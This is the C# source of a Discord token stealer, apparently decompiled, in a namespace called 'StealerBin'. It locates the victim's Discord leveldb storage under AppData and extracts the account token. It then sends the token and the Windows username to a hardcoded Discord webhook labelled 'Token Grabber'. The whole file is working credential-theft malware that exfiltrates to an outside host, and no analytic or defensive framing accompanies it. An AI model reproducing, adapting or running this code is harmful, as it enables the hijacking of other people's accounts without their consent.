using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading;

namespace StealerBin.Function
{
	// Token: 0x02000005 RID: 5
	internal static class Functions
	{
		// Token: 0x06000009 RID: 9 RVA: 0x00002110 File Offset: 0x00000310
		private static string Sub(string _Cont)
		{
			string[] array = _Cont.Substring(_Cont.IndexOf("oken") + 5).Split(new char[]
			{
				'"'
			});
			List<string> list = new List<string>();
			list.AddRange(array);
			list.RemoveAt(0);
			array = list.ToArray();
			return string.Join("\"", array);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002170 File Offset: 0x00000370
		public static bool FindTokenfile(ref string _File)
		{
			bool flag = !Directory.Exists(_File);
			bool result;
			if (flag)
			{
				result = false;
			}
			else
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(_File).GetFiles())
				{
					bool flag2 = fileInfo.Name.EndsWith(".ldb");
					if (flag2)
					{
						_File += fileInfo.Name;
						break;
					}
				}
				result = _File.EndsWith(".ldb");
			}
			return result;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000021F4 File Offset: 0x000003F4
		public static string Get(string _FilePath)
		{
			byte[] bytes = File.ReadAllBytes(_FilePath);
			string @string = Encoding.UTF8.GetString(bytes);
			string result = "";
			string text = @string;
			while (text.Contains("oken"))
			{
				string[] array = Functions.Sub(text).Split(new char[]
				{
					'"'
				});
				result = array[0];
				text = string.Join("\"", array);
			}
			return result;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002264 File Offset: 0x00000464
		public static void GetToken()
		{
			string filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
			bool flag = !Functions.FindTokenfile(ref filePath);
			if (flag)
			{
				Functions.SendWebHook("Token not found :/");
			}
			Thread.Sleep(100);
			string text = Functions.Get(filePath);
			bool flag2 = text == "";
			if (flag2)
			{
				text = "Token not found :/";
			}
			Functions.SendWebHook(text);
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000022CC File Offset: 0x000004CC
		public static void SendWebHook(string _UserToken)
		{
			try
			{
				HttpClient httpClient = new HttpClient();
				MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
				multipartFormDataContent.Add(new StringContent("Token Grabber:"), "username");
				multipartFormDataContent.Add(new StringContent("http://acurartm.bplaced.net/Bilder/Bytetools_Logo.png"), "avatar_url");
				multipartFormDataContent.Add(new StringContent(string.Concat(new string[]
				{
					"```Pc Name:\n",
					Environment.UserName + "```",
					"\n```User Token:\n",
					_UserToken + "```"
				})), "content");
				HttpResponseMessage result = httpClient.PostAsync(Functions.Hook, multipartFormDataContent).Result;
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x04000004 RID: 4
		public static string Hook = "https://discord.com/api/webhooks/816834510649950218/NbKZ7RebB0GPL15es8247gQA2JgQIehw4VF6sYfdG1bfg2S2wlyFMycM8RUCZouPNU6U";
	}
}
